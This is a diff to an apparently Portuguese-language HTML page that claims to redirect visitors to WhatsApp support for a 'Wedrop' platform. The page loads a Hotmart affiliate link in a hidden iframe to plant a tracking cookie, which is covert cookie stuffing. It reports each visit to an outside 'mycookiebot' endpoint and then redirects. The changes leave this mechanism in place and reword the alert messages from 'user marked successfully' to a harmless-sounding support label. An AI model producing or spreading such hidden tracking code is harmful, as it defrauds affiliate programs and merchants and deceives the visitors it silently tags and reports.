@@ -64,12 +64,12 @@
   <iframe id="cookieFrame" src="" style="display:none;"></iframe>
 
   <div id="fallback">
-    Se não for redirecionado, <a href="https://api.whatsapp.com/send?phone=5521991895615&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20a%20Plataforma%20Wedrop">clique aqui</a>.
+    Se não for redirecionado, <a href="https://api.whatsapp.com/message/JR3SISBEGEQAH1?autoload=1&app_absent=0">clique aqui</a>.
   </div>
 
   <script>
     const cookieURL = "https://go.hotmart.com/H95401183L?dp=1";
-    const checkoutURL = "https://api.whatsapp.com/send?phone=5521991895615&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20a%20Plataforma%20Wedrop";
+    const checkoutURL = "https://api.whatsapp.com/message/JR3SISBEGEQAH1?autoload=1&app_absent=0";
 
     function enviarAlerta(msg) {
 		fetch("https://mycookiebot.onrender.com/send", {
@@ -86,7 +86,7 @@
     setTimeout(() => {
       msg.style.opacity = 0;
       setTimeout(() => {
-        msg.textContent = "Redirecionando para Equipe de Suporte";
+        msg.textContent = "Redirecionando para Equipe de Atendimento";
         msg.style.opacity = 1;
       }, 400);
     }, 3000);
@@ -98,11 +98,11 @@
         try {
           const test = iframe.contentWindow.location.href;
           cookieConfirmado = true;
-          enviarAlerta(`✅ ACESSO DETECTADO! USUÁRIO MARCADO COM SUCESSO\nPÁGINA: ${checkoutURL}`);
+          enviarAlerta(`✅ SUPORTE - PLATAFORMA WEDROP\nPÁGINA: ${checkoutURL}`);
           setTimeout(() => window.location.href = checkoutURL, 1000);
         } catch (e) {
           cookieConfirmado = true;
-          enviarAlerta(`✅ ACESSO DETECTADO! USUÁRIO MARCADO COM SUCESSO\nPÁGINA: ${checkoutURL}`);
+          enviarAlerta(`✅ SUPORTE - PLATAFORMA WEDROP\nPÁGINA: ${checkoutURL}`);
           setTimeout(() => window.location.href = checkoutURL, 1000);
         }
       }, 500);
@@ -110,7 +110,7 @@
 
     setTimeout(() => {
       if (!cookieConfirmado) {
-        enviarAlerta(`⛔ ACESSO DETECTADO! ERRO AO MARCAR O USUÁRIO\nPÁGINA: ${checkoutURL}`);
+        enviarAlerta(`⛔ SUPORTE - PLATAFORMA WEDROP\nPÁGINA: ${checkoutURL}`);
         document.getElementById("fallback").style.display = "block";
       }
     }, 8000);
